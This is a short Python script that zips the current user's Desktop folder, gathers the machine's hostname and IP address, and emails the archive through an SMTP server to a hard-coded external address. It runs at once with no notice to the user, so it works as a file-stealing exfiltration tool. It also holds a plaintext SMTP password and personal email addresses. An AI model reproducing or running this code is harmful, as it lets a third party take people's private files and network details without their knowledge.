import smtplib
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email import encoders
from email import message
import socket
import os
import shutil


def Send_File(to_address,folder_address,file_name) :
    
    shutil.make_archive(file_name, 'zip', folder_address)
    print("files of"+folder_address+"zipped!")

    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname)    

    from_address = "from@webghoo.com"
    to_address = to_address
    subject = file_name + "Files"
    content = "Your Computer Name is:" + hostname + '''
    Your Computer IP Address is:''' + IPAddr

    msg = MIMEMultipart()

    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject
    body = MIMEText(content, 'plain')
    msg.attach(body)


    part = MIMEBase("application", "octet-stream")
    part.set_payload(open(file_name + ".zip", "rb").read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename=\"%s.zip\"" % (file_name))
    msg.attach(part)


    serverr = smtplib.SMTP("mail.webghoo.com",587)
    serverr.login(from_address,"Rasam4288963")


    serverr.send_message(msg,from_addr=from_address,to_addrs=[to_address])
    os.remove(file_name +".zip")



folder_address = os.path.expanduser("~/" + "Desktop")

Send_File(to_address="alipour.rasam@gmail.com",folder_address=folder_address,file_name="Desktop")
